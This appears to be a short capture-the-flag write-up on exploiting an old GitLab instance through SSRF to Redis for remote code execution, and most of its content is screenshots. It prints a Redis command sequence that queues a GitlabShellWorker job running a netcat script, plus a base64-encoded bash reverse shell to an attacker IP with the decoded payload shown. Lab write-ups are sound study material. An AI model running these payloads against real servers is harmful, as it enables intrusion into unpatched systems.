![[Pasted image 20210516094300.png]]

## >> Created a User:

![[Pasted image 20210516094518.png]]

## >> Enumeration:

### Visiting the Help Page of Gitlab we were able to get the version of Gitlab:

![[Pasted image 20210516095027.png]]

### It already looks like a very old version.

### Searching for exploits on the web some intersting blog showed up-
### 1.https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
### 2.https://github.com/jas502n/gitlab-SSRF-redis-RCE

# >>Exploitation-
### Tried to ping our box-
![[Pasted image 20210516112151.png]]

### Netcat-

![[Pasted image 20210516112353.png]]

## >>SSRF+Redish RCE-
### 1.gitlab vuln: >>import project>> Repo by URL >> Git repository URL (ipv6 Bypass block url)
### 2.git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git
![[Pasted image 20210516113209.png]]

### 3.Capture the request using burp-

![[Pasted image 20210516114506.png]]

### 4.Modify the request after .git to get a reverse shell(Base 64 encode the shell to bypass badchar)
### 5.POC -
```bash
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|setsid python /tmp/nc.py xx.xx.xx.xx 1234 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
```

### 6.`echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTExLzkwMDEgMD4mMQ== | base64 -d | bash`      [Payload: bash  -i >& /dev/tcp/10.10.14.111/9001 0>&1]

![[Pasted image 20210516115424.png]]

![[Pasted image 20210516115528.png]]

![[Pasted image 20210516115558.png]]